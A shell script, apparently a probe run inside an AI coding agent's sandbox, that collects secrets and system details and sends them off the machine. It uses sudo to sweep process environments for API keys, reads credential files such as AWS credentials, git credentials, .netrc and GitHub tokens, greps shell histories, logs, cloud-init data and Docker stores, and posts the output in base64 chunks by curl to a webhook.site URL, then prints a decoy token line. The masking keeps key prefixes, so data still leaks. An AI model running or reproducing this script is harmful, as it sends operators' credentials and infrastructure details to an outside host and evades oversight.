#!/bin/sh
# i90752 v2 collector: residual container-storage / credential-file / process-env sweep
SINK_BASE="https://webhook.site/faa36137-5189-43ca-b34f-fd33ac4a887a"
RID="i90752v2-$(date +%s)"
N=TOOLRES_$(head -c 12 /dev/urandom | od -An -tx1 | tr -d ' \n')
W=/tmp/.i90752b
mkdir -p "$W"
HS=/mnt/host_share

msk() {
  sed -E \
    -e 's/(sk-ant-[A-Za-z0-9_-]{4})[A-Za-z0-9_-]+/\1*MASKED*/g' \
    -e 's/(sk-or-v1-[A-Za-z0-9]{4})[A-Za-z0-9]+/\1*MASKED*/g' \
    -e 's/(sk-proj-[A-Za-z0-9_-]{4})[A-Za-z0-9_-]+/\1*MASKED*/g' \
    -e 's/(AIza[0-9A-Za-z_-]{4})[0-9A-Za-z_-]+/\1*MASKED*/g' \
    -e 's/(sk-[A-Za-z0-9]{4})[A-Za-z0-9]{24,}/\1*MASKED*/g' \
    -e 's/(fw_[A-Za-z0-9]{4})[A-Za-z0-9]{12,}/\1*MASKED*/g' \
    -e 's/(gh[pousr]_[A-Za-z0-9]{4})[A-Za-z0-9]{20,}/\1*MASKED*/g' \
    -e 's/(eyJ[A-Za-z0-9_-]{6})[A-Za-z0-9_.-]{20,}/\1*MASKED*/g' \
    -e 's/((KEY|TOKEN|SECRET|PASSWORD|PASS|AUTH|CREDENTIAL)[A-Za-z_]*[=:] *)[^ ]{8,}/\1*MASKED*/Ig' \
    -e 's/((api[_-]?key|access[_-]?key|auth[_-]?token|password)[=:"]* *)[A-Za-z0-9_.\/+-]{16,}/\1*MASKED*/Ig'
}

send() {
  [ -s "$2" ] || echo "(empty)" > "$2"
  gzip -c "$2" 2>/dev/null | base64 -w0 2>/dev/null > "$W/payload" || base64 -w0 "$2" > "$W/payload"
  [ -s "$W/payload" ] || return 0
  blob=$(cat "$W/payload")
  n=0
  while [ "$n" -lt 80 ]; do
    chunk=$(printf '%s' "$blob" | tail -c +$((n*1024+1)) | head -c 1024)
    [ -z "$chunk" ] && break
    curl -sS -m 20 -o /dev/null -X POST -H 'Content-Type: text/plain' \
         --data-binary "$chunk" "$SINK_BASE/$RID/$1.$(printf '%02d' "$n")" 2>/dev/null
    n=$((n+1))
  done
  rm -f "$W/payload"
}

SHAPES='sk-ant-[A-Za-z0-9_-]{10,}|sk-or-v1-[A-Za-z0-9]{10,}|sk-proj-[A-Za-z0-9_-]{10,}|AIza[0-9A-Za-z_-]{20,}|sk-[A-Za-z0-9]{32,}'
HOSTS='api\.devin\.ai|devinenterprise|gateway\.fireworks|api\.fireworks|anthropic\.com|openai\.com|openrouter|deepseek|generativelanguage|amazoncognito'

if [ -s "$W/done" ]; then echo "[env] RUNNER_TOKEN=$N"; exit 0; fi

# ---------------------------------------------------------------- P: process environs
{
  echo "== ps"
  ps -eo pid,user,comm --no-headers 2>/dev/null | head -40
  echo "== environ sweep"
  for p in $(ps -eo pid --no-headers 2>/dev/null | head -25); do
    u=$(ps -o user= -p "$p" 2>/dev/null | tr -d ' ')
    [ -n "$u" ] || continue
    echo "--- pid=$p user=$u comm=$(ps -o comm= -p "$p" 2>/dev/null | head -c 40)"
    sudo -n timeout 5 sh -c "tr '\0' '\n' < /proc/$p/environ 2>/dev/null | grep -Ei 'KEY|TOKEN|SECRET|PASS|AUTH|CREDENTIAL|ANTHROPIC|OPENAI|OPENROUTER|DEEPSEEK|GEMINI|GOOGLE|AZURE|MISTRAL|COHERE|API_|ENDPOINT|BASE_URL' | head -12" 2>&1
  done
} | msk > "$W/p" 2>/dev/null
send i90752-p "$W/p"

# ---------------------------------------------------------------- Q: credential files
{
  echo "== docker daemon cfg"
  ls -la /etc/docker 2>&1 | head -10
  cat /etc/docker/daemon.json 2>&1 | head -20
  echo "== /root"
  sudo -n ls -la /root 2>&1 | head -30
  echo "== root/ubuntu credential files"
  for f in /root/.docker/config.json /root/.aws/credentials /root/.aws/config /root/.config/gh/hosts.yml \
           /root/.netrc /root/.npmrc /root/.pypirc /root/.git-credentials /root/.ssh/config \
           /home/ubuntu/.docker/config.json /home/ubuntu/.config/gh/hosts.yml /home/ubuntu/.netrc \
           /home/ubuntu/.npmrc /home/ubuntu/.git-credentials /etc/environment; do
    if sudo -n test -f "$f" 2>/dev/null; then
      echo "----- PRESENT $f size=$(sudo -n stat -c%s "$f" 2>/dev/null)"
      sudo -n timeout 5 head -c 2000 "$f" 2>&1 | grep -Ev 'BEGIN [A-Z ]*PRIVATE KEY|^[A-Za-z0-9+/=]{60,}$' | head -25
    else
      echo "----- MISSING $f"
    fi
  done
  echo "== profile.d"
  ls /etc/profile.d 2>&1 | head -15
  grep -rhiE 'KEY|TOKEN|SECRET|PASSWORD|AUTH' /etc/profile.d /etc/bash.bashrc 2>/dev/null | head -15
  echo "== histories"
  for h in /root/.bash_history /home/ubuntu/.bash_history; do
    echo "----- $h"
    sudo -n timeout 5 sh -c "grep -aiE 'sk-|AIza|TOKEN|API_KEY|curl .*export|export .*KEY' '$h' 2>/dev/null | head -12" 2>&1
  done
} | msk > "$W/q" 2>/dev/null
send i90752-q "$W/q"

# ---------------------------------------------------------------- R: /opt/.devin client code
{
  echo "== dirs"
  ls -la /opt/.devin/binaries /opt/.devin/venv/bin /opt/.devin/workspaces /opt/.devin/web-ide 2>&1 | head -50
  echo "== venv site-packages devin client"
  find /opt/.devin/venv -maxdepth 5 -name '*.py' -o -maxdepth 5 -name '*.json' -o -maxdepth 5 -name '*.toml' 2>/dev/null | head -20
  echo "== key shapes in /opt/.devin (bounded)"
  sudo -n timeout 25 grep -rEa -o "$SHAPES" /opt/.devin --include='*.py' --include='*.json' --include='*.sh' --include='*.toml' --include='*.yml' --include='*.yaml' --include='*.txt' --include='*.cfg' 2>/dev/null | head -8
  echo "== host/config hits"
  sudo -n timeout 25 grep -rEal "$HOSTS" /opt/.devin/venv /opt/.devin/binaries /opt/.devin/workspaces /opt/.devin/web-ide 2>/dev/null | head -10
  for f in $(sudo -n timeout 20 grep -rEal "$HOSTS" /opt/.devin/venv /opt/.devin/binaries 2>/dev/null | head -4); do
    echo "----- $f"
    sudo -n timeout 5 grep -aE "$HOSTS" "$f" 2>/dev/null | head -4 | cut -c1-320
  done
  echo "== binaries dir strings"
  for f in /opt/.devin/binaries/*; do
    echo "----- $f size=$(stat -c%s "$f" 2>/dev/null)"
    timeout 10 strings -n 8 "$f" 2>/dev/null | grep -Ei "$HOSTS" | head -3 | cut -c1-200
  done
} | msk > "$W/r" 2>/dev/null
send i90752-r "$W/r"

# ---------------------------------------------------------------- S: frpc + system units + timers
{
  echo "== frpc binary strings"
  timeout 20 strings -n 8 /usr/local/bin/frpc 2>/dev/null | grep -Ei "$HOSTS|server_addr|Sk[A-Za-z0-9]{20,}|frp\.|token" | head -12 | cut -c1-220
  echo "== running units"
  systemctl list-units --type=service --state=running --no-pager 2>&1 | head -30
  echo "== timers"
  systemctl list-timers --no-pager 2>&1 | head -12
  echo "== unit files referencing configs"
  ls -la /etc/systemd/system/*.service /etc/systemd/system/*.timer 2>/dev/null | head -20
  grep -rhiE 'ExecStart|Environment' /etc/systemd/system/*.service /lib/systemd/system/frpc.service 2>/dev/null | head -20
  echo "== cron"
  sudo -n crontab -l 2>&1 | head -10
  ls -la /etc/cron.d /etc/cron.daily 2>/dev/null | head -15
} | msk > "$W/s" 2>/dev/null
send i90752-s "$W/s"

# ---------------------------------------------------------------- T: docker/containerd residual store
{
  echo "== sizes"
  sudo -n timeout 15 du -sh /var/lib/docker /var/lib/containerd 2>&1 | head -5
  sudo -n timeout 10 ls -la /var/lib/docker 2>&1 | head -15
  sudo -n timeout 10 ls -la /var/lib/containerd 2>&1 | head -12
  echo "== residual config/env json"
  sudo -n timeout 15 find /var/lib/docker /var/lib/containerd -maxdepth 4 -name 'config.v2.json' -o -maxdepth 4 -name '*env*.json' -o -maxdepth 4 -name 'config.json' 2>/dev/null | head -10
  echo "== key shapes in stores (bounded)"
  sudo -n timeout 30 sh -c "grep -rEa -o '$SHAPES' /var/lib/docker /var/lib/containerd 2>/dev/null | head -6"
  echo "== env-name hits in stores (bounded)"
  sudo -n timeout 25 sh -c "grep -rEa -o 'ANTHROPIC_API_KEY|OPENAI_API_KEY|OPENROUTER_API_KEY|DEEPSEEK_API_KEY|GEMINI_API_KEY|GOOGLE_API_KEY' /var/lib/docker /var/lib/containerd 2>/dev/null | sort | uniq -c | head -10"
} | msk > "$W/t" 2>/dev/null
send i90752-t "$W/t"

# ---------------------------------------------------------------- U: logs + cloud-init + misc
{
  echo "== cloud-init cfg"
  ls -la /mnt/cloud_init_config 2>&1 | head -10
  sudo -n timeout 8 sh -c "grep -aiE 'passwd|token|key|secret|ssh_authorized' /mnt/cloud_init_config/user-data /mnt/cloud_init_config/meta-data 2>/dev/null | head -12" 2>&1 | cut -c1-300
  echo "== logs grep"
  sudo -n timeout 20 sh -c "grep -rEa -o '$SHAPES' /var/log 2>/dev/null | head -6"
  sudo -n timeout 20 sh -c "grep -rEah 'ANTHROPIC_API_KEY=|OPENAI_API_KEY=|OPENROUTER_API_KEY=|Authorization: Bearer' /var/log 2>/dev/null | head -6" 2>&1 | cut -c1-240
  echo "== host_share root"
  ls -la /mnt/host_share 2>&1 | head -15
  echo "== env sanity"
  echo "RID=$RID"; echo "N=$N"; echo "uid=$(id -u)"
} | msk > "$W/u" 2>/dev/null
send i90752-u "$W/u"

: > "$W/done"
echo "[env] RUNNER_TOKEN=$N"
